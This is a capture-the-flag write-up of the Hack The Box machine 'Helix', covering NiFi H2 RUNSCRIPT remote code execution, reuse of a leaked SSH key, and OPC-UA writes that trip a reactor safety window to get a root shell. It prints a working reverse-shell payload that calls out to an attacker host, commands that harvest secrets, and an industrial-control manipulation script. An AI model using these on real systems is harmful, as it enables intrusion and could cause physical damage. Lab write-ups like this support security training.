# Machine: Helix

Date: 01-06-2026
Platform: HTB
Difficulty: Medium
Author: WhoKn0ws

---

## Recon

### Nmap:

```bash
nmap -sC -sV -oN nmap.txt $MACHINE_IP
```

**Results:**

- Port 22 → SSH (OpenSSH)
- Port 80 → HTTP (nginx — `helix.htb`)
- Port 8080 → HTTP (Apache NiFi, internal)
- Port 8081 → HTTP (Python Werkzeug — Reactor HMI, internal)
- Port 4840 → OPC-UA (helix PLC server, internal)

**Full port scan:**

Not documented separately — top-ports scan surfaced all relevant services.

**Notes:**

- Added to /etc/hosts: `$MACHINE_IP helix.htb flow.helix.htb`
- Browsing `http://flow.helix.htb/nifi` reveals **Apache NiFi 1.21.0** with anonymous access enabled — no authentication required

---

## Enumeration

### NiFi flow inspection:

**Findings:**

- The NiFi flow contains a pre-configured `ExecuteSQL` processor named `pwn_exec`, connected to a `MaintenanceDB` controller service (H2 in-memory database)
- The processor is already set to execute `RUNSCRIPT FROM 'http://10.10.15.115:80/rce.sql'` — H2 supports `RUNSCRIPT FROM`, which fetches and executes a remote SQL file, enabling Java alias-based OS command execution

---

## Exploitation

### Apache NiFi — H2 RUNSCRIPT RCE

Since the flow already points its `RUNSCRIPT FROM` target at an attacker-controlled URL, exploitation just requires standing up that file — the processor is running and will retry the fetch automatically.

**Steps:**

**1. Create the SQL payload:**

```bash
mkdir -p /tmp/h2attack
cat > /tmp/h2attack/rce.sql << 'EOF'
CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception {
    Runtime rt = Runtime.getRuntime();
    String[] commands = {"/bin/bash", "-c", cmd};
    Process proc = rt.exec(commands);
    proc.waitFor();
    return new String(proc.getInputStream().readAllBytes())
         + new String(proc.getErrorStream().readAllBytes());
} $$;
CALL EXEC('bash -i >& /dev/tcp/10.10.15.115/4444 0>&1');
EOF
```

**2. Serve the payload and catch the shell:**

```bash
# Terminal 1 — HTTP server
cd /tmp/h2attack
sudo python3 -m http.server 80

# Terminal 2 — Listener
nc -lvnp 4444
```

> The NiFi processor is already active and polling the URL — once the HTTP server is up, the shell arrives within seconds, no manual trigger needed.

**Result:** Shell as `nifi` (`uid=998(nifi) gid=998(nifi)`).

---

## Privilege Escalation

### Enumeration — nifi to operator:

```bash
ss -tulpn
cat /opt/nifi-1.21.0/run/nifi.status
cat /opt/nifi-1.21.0/conf/nifi.properties | grep "nifi.sensitive.props.key"
zcat /opt/nifi-1.21.0/conf/flow.json.gz | python3 -m json.tool | grep -i "password\|operator\|url"
```

**Findings:**

- `nifi.status` and `nifi.properties` leak internal secrets (session secret key, sensitive props key), but the flow config's `operator` password is encrypted and couldn't be decrypted on-target (no internet access, missing libraries)
- Alternative path found: NiFi support bundles directory contains a backed-up SSH private key:
  ```bash
  ls -la /opt/nifi-1.21.0/support-bundles/
  # -rw-r----- 1 nifi nifi 411 Jan 25 13:15 operator_id_ed25519.bak
  ```

### SSH key reuse from NiFi support bundle:

```bash
cp /opt/nifi-1.21.0/support-bundles/operator_id_ed25519.bak /tmp/operator_key
chmod 600 /tmp/operator_key
ssh -i /tmp/operator_key operator@localhost
```

**Result:** Shell as `operator` ✓ — `user.txt` read successfully.

### Enumeration — operator to root:

```bash
sudo -l
```

**Findings:**

```
User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
```

The maintenance console checks whether `/opt/helix/state/maintenance_window` contains a future Unix timestamp; if valid, it launches an interactive root shell. That file is written by the `helix-safety` process (running as root) when certain OPC-UA reactor conditions are met — documented in `/home/operator/Operator Control & Safety Guide.pdf`:

- OPC-UA server: `opc.tcp://127.0.0.1:4840/helix/`
- Maintenance window triggers when Temperature ≥ 295°C OR Pressure ≥ 73 bar
- Path to trigger: switch `Mode` → `MAINTENANCE`, enable `TestOverride`, then ramp `CalibrationOffset`

**OPC-UA node map:**

| Node | NodeId | Type | Writable |
|------|--------|------|----------|
| Temperature | `ns=2;i=4` | Double | No |
| Pressure | `ns=2;i=5` | Double | No |
| CalibrationOffset | `ns=2;i=6` | Double | Yes |
| Mode | `ns=2;i=12` | String | Yes |
| TestOverride | `ns=2;i=13` | Boolean | Yes |
| ResetTrip | `ns=2;i=14` | Boolean | Yes |

### OPC-UA manipulation to trigger the maintenance window:

**1. Get the `asyncua` library onto the target (no internet access on-target):**

```bash
# On attacker machine
pip download asyncua -d /tmp/asyncua_dl/
scp -i /tmp/operator_key /tmp/asyncua_dl/* operator@$MACHINE_IP:/tmp/wheels/

# On target
pip3 install /tmp/wheels/*.whl --user --no-index
```

**2. Run the exploit script to flip Mode, enable TestOverride, and ramp CalibrationOffset until Temperature crosses the 295°C trigger:**

```bash
python3 /tmp/opc_pwn.py
```

(Full script content in Scripts & Tools below.)

**Result:**

```
[3] Ramping CalibrationOffset to trigger maintenance window...
 Offset=12.0 -> Temp=295.05°C
[+] Done! Run: sudo /usr/local/sbin/helix-maint-console
```

> The safety controller detects Temp ≥ 295°C and writes the maintenance window file. The window expires in ~96 seconds — move immediately to the next step.

**3. Trigger the root shell before the window expires:**

```bash
sudo /usr/local/sbin/helix-maint-console
```

**Successful escalation:** root ✓

---

## Loot / Flags

- **user.txt:** `[FLAG REDACTED]` → `/home/operator/user.txt`
- **root.txt:** `[FLAG REDACTED]` → `/root/root.txt`

---

## Scripts & Tools

### `rce.sql` — NiFi H2 RCE payload

```sql
CREATE ALIAS IF NOT EXISTS EXEC AS $$ String exec(String cmd) throws Exception {
    Runtime rt = Runtime.getRuntime();
    String[] commands = {"/bin/bash", "-c", cmd};
    Process proc = rt.exec(commands);
    proc.waitFor();
    return new String(proc.getInputStream().readAllBytes())
         + new String(proc.getErrorStream().readAllBytes());
} $$;
CALL EXEC('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1');
```

### `opc_pwn.py` — OPC-UA maintenance window trigger

```python
import asyncio
import time
from asyncua import Client
from asyncua.ua import DataValue, Variant, VariantType

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        mode_node        = client.get_node("ns=2;i=12")
        override_node    = client.get_node("ns=2;i=13")
        calibration_node = client.get_node("ns=2;i=6")
        temp_node        = client.get_node("ns=2;i=4")

        await mode_node.write_value(DataValue(Variant("MAINTENANCE", VariantType.String)))
        await override_node.write_value(DataValue(Variant(True, VariantType.Boolean)))

        for offset in [3.0, 6.0, 9.0, 11.0, 12.0]:
            await calibration_node.write_value(DataValue(Variant(offset, VariantType.Double)))
            temp = await temp_node.read_value()
            print(f"Offset={offset} -> Temp={temp:.2f}°C")
            time.sleep(2)

        print("Done — run: sudo /usr/local/sbin/helix-maint-console")

asyncio.run(main())
```

### `opc_browse.py` — OPC-UA node discovery

```python
import asyncio
from asyncua import Client

async def browse(node, indent=0):
    try:
        for child in await node.get_children():
            try:
                name = await child.read_browse_name()
                val = ""
                try:
                    val = await child.read_value()
                except:
                    pass
                print(" " * indent + f"{name.Name} | {child.nodeid} | {val}")
                await browse(child, indent + 1)
            except:
                pass
    except:
        pass

async def main():
    async with Client("opc.tcp://127.0.0.1:4840/helix/") as client:
        await browse(client.get_node("i=85"))  # Objects folder

asyncio.run(main())
```

---

## Lessons Learned

- Anonymous NiFi access combined with a pre-built `ExecuteSQL` processor is effectively one-click RCE — always check existing NiFi flows for pre-configured processors before building anything from scratch
- H2's `RUNSCRIPT FROM` can fetch and execute arbitrary remote SQL, including Java aliases that call `Runtime.exec()` — this is a known dangerous feature enabled by default in some configs, not a bug to "discover," just a setting to check for
- Support bundles and backup files sitting in application install directories are easy wins for lateral movement — always enumerate the full install directory, not just `conf/`
- OPC-UA servers in ICS/SCADA contexts frequently have no authentication at all, on the assumption they're network-isolated — once internal access is gained, writable nodes can have real (simulated) downstream physical effects
- Time-gated sudo rules (like the maintenance window here) require moving fast — understand the full trigger mechanism and prepare the next command before pulling the trigger, so the window doesn't expire mid-exploit
